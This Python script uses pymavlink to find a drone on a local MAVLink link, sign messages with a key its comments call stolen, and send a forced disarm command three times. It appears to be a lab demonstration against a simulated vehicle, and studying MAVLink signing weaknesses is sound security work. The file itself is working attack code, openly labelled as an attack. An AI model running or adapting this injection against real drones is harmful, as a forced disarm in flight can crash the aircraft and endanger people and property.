import time
from pymavlink import mavutil
import hashlib

# 1. Connect
connection = mavutil.mavlink_connection('udp:127.0.0.1:14550', source_system=255)

print("Scanning for DRONE (System 1)...")
while True:
    msg = connection.wait_heartbeat()
    sys_id = msg.get_srcSystem()
    if sys_id == 1:
        print(f" >> LOCKED ON: Drone found! (System {sys_id})")
        connection.target_system = sys_id
        connection.target_component = msg.get_srcComponent()
        break

# --- THE KEY DIFFERENCE ---
# The attacker has the stolen key and tells pymavlink to sign the attack!
#stolen_key = "password123456789012345678901234"
#key_bytes = stolen_key.encode('utf-8')

# --- AUTHORIZED GCS SIGNATURE ---
HUMAN_PASSWORD = "ardupilot"
SECRET_KEY = hashlib.sha256(HUMAN_PASSWORD.encode('utf-8')).digest()

# Apply the hashed key to the attacker's outgoing messages
connection.setup_signing(SECRET_KEY, sign_outgoing=True)


# We apply the key to our outgoing connection
#connection.setup_signing(key_bytes, sign_outgoing=True)
print("Attacker is now SIGNING messages with the stolen key...")
# --------------------------

# 3. ATTACK
print("INJECTING SECURE DISARM COMMAND TO SYSTEM 1...")
for i in range(3):
    connection.mav.command_long_send(
        connection.target_system,
        connection.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0,
        0,      # Param 1: 0 = Disarm
        21196,  # Param 2: Force Disarm Magic Number
        0, 0, 0, 0, 0
    )
    time.sleep(0.1)

print("Signed Command Sent. Check the drone.")
